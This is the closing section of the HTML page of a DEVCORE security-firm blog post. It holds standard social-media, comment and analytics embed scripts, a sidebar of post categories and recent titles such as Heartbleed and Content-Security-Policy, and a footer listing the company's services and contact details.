                      <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
                    </div>
                  </div>
                  


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




                </div>
                <div class="post-sidebar">
                  <!--文章分類-->
                  <div class="widget">
                    <div class="widget-title">
                      文章分類
                    </div>
                    <ul class="widget-list">
                      
                                        
                    
                      <li>
                        <a href="/blog/category/最新消息/">最新消息 <span class="count">(1)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/案例剖析/">案例剖析 <span class="count">(2)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/技術專欄/">技術專欄 <span class="count">(3)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/科普文章/">科普文章 <span class="count">(1)</span></a>
                      </li>
                    
                  
                      <li>
                        <a href="/blog/archive"><div class="widget-list-title">所有文章列表 »</div></a>
                      </li>
                      <li>
                        <gcse:search></gcse:search>
                      </li>

                    </ul>
                  </div>
                  <!--文章分類 end--><!--最新文章-->
                  <div class="widget">
                    <div class="widget-title">
                      最新文章
                    </div>
                    <ul class="widget-list">
                        
                      <li>
                        <a href="/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/">
                          <div class="widget-list-title">
                            HTTP Headers 的資安議題 (2) - Content-Security-Policy
                          </div>
                          <div class="widget-list-date">
                            2014-04-08
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160/">
                          <div class="widget-list-title">
                            OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 
                          </div>
                          <div class="widget-list-date">
                            2014-04-08
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/03/31/Google-Account-Phishing-Scam/">
                          <div class="widget-list-title">
                            Google 帳號釣魚案例
                          </div>
                          <div class="widget-list-date">
                            2014-03-31
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/03/14/3rd-party-software-security-issues/">
                          <div class="widget-list-title">
                            使用第三方套件所要擔負的資安風險
                          </div>
                          <div class="widget-list-date">
                            2014-03-14
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/03/10/security-issues-of-http-headers-1/">
                          <div class="widget-list-title">
                            HTTP Headers 的資安議題 (1)
                          </div>
                          <div class="widget-list-date">
                            2014-03-10
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/03/06/qiyou-ads-hijacking/">
                          <div class="widget-list-title">
                            奇優廣告 Qiyou 廣告手法剖析
                          </div>
                          <div class="widget-list-date">
                            2014-03-06
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2014/02/27/devcore-new-website/">
                          <div class="widget-list-title">
                            DEVCORE 新網站上線！
                          </div>
                          <div class="widget-list-date">
                            2014-02-27
                          </div>
                        </a>
                      </li>
  

                    </ul>
                  </div>
                  <!--最新文章 end--><!--文章標籤-->
                  <div class="widget">
                    <div class="widget-title">
                      文章標籤
                    </div>
                    <ul class="widget-tags">
                      
                                        
                    
                      <li><a href="/blog/tag/公告/">公告 <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/JavaScript/">JavaScript <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Hijack/">Hijack <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/HTTP header/">HTTP header <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/Defense/">Defense <span class="count">(2)</span></a></li>
                    
                      <li><a href="/blog/tag/OpenSource/">OpenSource <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Vulnerability/">Vulnerability <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Mail/">Mail <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/Phishing/">Phishing <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/openssl/">openssl <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/vulnerability/">vulnerability <span class="count">(1)</span></a></li>
                    
                      <li><a href="/blog/tag/XSS/">XSS <span class="count">(1)</span></a></li>
                    
                  
                

                    </ul>
                  </div>
                  <!--文章標籤 end-->
                </div>
              </div>
              <div id="fb-root"></div>
              <script>(function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                if (d.getElementById(id)) return;
                js = d.createElement(s); js.id = id;
                js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
                fjs.parentNode.insertBefore(js, fjs);
              }(document, 'script', 'facebook-jssdk'));</script>
            </div>
          </div>


        </div>
        <div class="footer">
          <div class="footer-inner">
            <div class="footer-top">
              <div class="footer-services">
                <a class="footer-service col" href="/services/penetration-test" title="滲透測試 Penetration Test">
                  <div class="footer-service-icon service-icon service-icon-penetration-test"></div>
                  <div class="footer-service-title">
                    滲透測試
                  </div>
                </a><a class="footer-service col" href="/services/security-training" title="資安教育訓練 Security Training">
                  <div class="footer-service-icon service-icon service-icon-security-training"></div>
                  <div class="footer-service-title">
                    資安教育訓練
                  </div>
                </a><a class="footer-service col" href="/services/incident-response" title="資安事件處理 Incident Response">
                  <div class="footer-service-icon service-icon service-icon-incident-response"></div>
                  <div class="footer-service-title">
                    資安事件處理
                  </div>
                </a><a class="footer-service col" href="/services/security-consulting" title="資安顧問服務 Security Consulting">
                  <div class="footer-service-icon service-icon service-icon-security-consulting"></div>
                  <div class="footer-service-title">
                    資安顧問服務
                  </div>
                </a>
              </div>
            </div>
            <div class="footer-bottom">
              <div class="footer-links-group">
                <ul class="footer-links">
                  <li>
                    <a href="/services/penetration-test" title="滲透測試 Penetration Test">Services</a>
                  </li>
                  <li>
                    <a href="/blog/" title="部落格 Blog">Blog</a>
                  </li>
                  <li>
                    <a href="/about/" title="關於 About">About</a>
                  </li>
                  <li>
                    <a href="/contact/" title="聯絡 Contact">Contact</a>
                  </li>
                </ul>
                <ul class="footer-links">
                  <li>
                    <a href="/services/security-seal" title="網站安全標章 Security Seal">Security Seal</a>
                  </li>
                  <li>
                    <a href="/partners/" title="合作夥伴 Partners">Partners</a>
                  </li>
                </ul>
                <ul class="footer-links">
                  <li>
                    <a href="https://www.facebook.com/D3VC0RE" title="DEVCORE Facebook 粉絲團" target="_blank">Facebook</a>
                  </li>
                  <li>
                    <a href="https://plus.google.com/118439315679478709768/posts" title="DEVCORE Google+ 專頁" target="_blank">Google+</a>
                  </li>
                  <li>
                    <a href="https://twitter.com/d3vc0r3" title="DEVCORE Twitter" target="_blank">Twitter</a>
                  </li>
                </ul>
              </div>
              <ul class="footer-info">
                <li>
                  電話: 02-8751-6287
                </li>
                <li>
                  Email: contact [at] devco.re
                </li>
                <li>
                  統編: 53955237
                </li>
              </ul>
              <ul class="footer-info">
                <li>
                  台北市內湖區瑞光路 583 巷 32 號 7 樓
                </li>
                <li>
                  ©2014 DEVCORE 戴夫寇爾
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div class="off-canvas-mask"></div>
      </div>
    </div>
    <script src="/assets/themes/devcore/javascripts/vender/modernizr.js" type="text/javascript"></script>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" type="text/javascript"></script>
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/off-canvas.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/all.min.js" type="text/javascript"></script>
    <script src="/assets/themes/devcore/javascripts/gcse.js" type="text/javascript"></script>
    


  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager -->
    <noscript>
      <iframe src="//www.googletagmanager.com/ns.html?id=GTM-K5B8NW" height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <script>
      (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-K5B8NW');
    </script>
    <!-- End Google Tag Manager -->
  </body>
</html>

